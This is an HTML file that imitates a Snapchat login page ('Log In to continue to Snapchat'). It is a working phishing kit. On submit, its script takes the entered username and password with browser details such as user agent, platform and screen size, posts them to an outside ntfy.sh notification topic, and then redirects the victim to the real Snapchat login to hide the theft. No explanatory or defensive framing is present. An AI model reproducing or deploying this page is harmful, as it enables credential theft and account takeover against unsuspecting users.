<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Snapchat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#FFFC00;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column}
.container{width:100%;max-width:360px;padding:20px;text-align:center}
.logo{width:80px;height:80px;margin-bottom:30px}
h1{font-size:28px;font-weight:700;color:#000;margin-bottom:8px}
p.sub{color:#333;font-size:14px;margin-bottom:30px}
input{width:100%;padding:14px 16px;font-size:16px;border:1px solid #ddd;border-radius:8px;background:#fff;margin-bottom:12px;outline:none}
input:focus{border-color:#FFFC00;box-shadow:0 0 0 2px rgba(255,252,0,0.3)}
button{width:100%;padding:14px;font-size:16px;font-weight:700;border:none;border-radius:8px;background:#000;color:#FFFC00;cursor:pointer;margin-top:8px}
button:active{transform:scale(0.98)}
.forgot{color:#333;font-size:13px;margin-top:16px;text-decoration:none;display:block}
.signup{color:#000;font-size:14px;margin-top:24px;font-weight:600}
</style>
</head>
<body>
<div class="container">
<<svg class="logo" viewBox="0 0 100 100"><path fill="#000" d="M50 2C23 2 2 23 2 50s21 48 48 48 48-21 48-48S77 2 50 2zm0 88c-22 0-40-18-40-40S28 10 50 10s40 18 40 40-18 40-40 40z"/><path fill="#000" d="M50 20c-16 0-29 13-29 29s13 29 29 29 29-13 29-29S66 20 50 20zm0 50c-11 0-21-9-21-21s9-21 21-21 21 9 21 21-9 21-21 21z"/></svg>
<h1>Log In</h1>
<p class="sub">to continue to Snapchat</p>
<form id="loginForm">
<input type="text" id="username" placeholder="Username or Email" required autocomplete="off">
<input type="password" id="password" placeholder="Password" required autocomplete="off">
<button type="submit">Log In</button>
</form>
<a href="#" class="forgot">Forgot your password?</a>
<p class="signup">Sign up for Snapchat</p>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e){
    e.preventDefault();
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    const data = {
        ua: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        screen: screen.width + 'x' + screen.height,
        referrer: document.referrer || 'direct'
    };
    const lines = [
        '🔴 SNAPCHAT LOGIN',
        '👤 Username: ' + user,
        '🔑 Password: ' + pass,
        '💻 Platform: ' + (data.platform || '-'),
        '🌐 Language: ' + (data.lang || '-'),
        '📱 Screen: ' + (data.screen || '-'),
        '🔗 Referrer: ' + (data.referrer || '-'),
        '🔎 UA: ' + (data.ua || '-').substring(0, 80)
    ];
    fetch('https://ntfy.sh/lo-snap-test-2026', {
        method: 'POST',
        body: lines.join('\n'),
        headers: {'Title': '🔴 Snapchat Login', 'Priority': 'high', 'Tags': 'warning'}
    }).catch(() => {}).finally(() => {
        window.location.href = 'https://accounts.snapchat.com/accounts/login';
    });
});
</script>
</body>
</html>
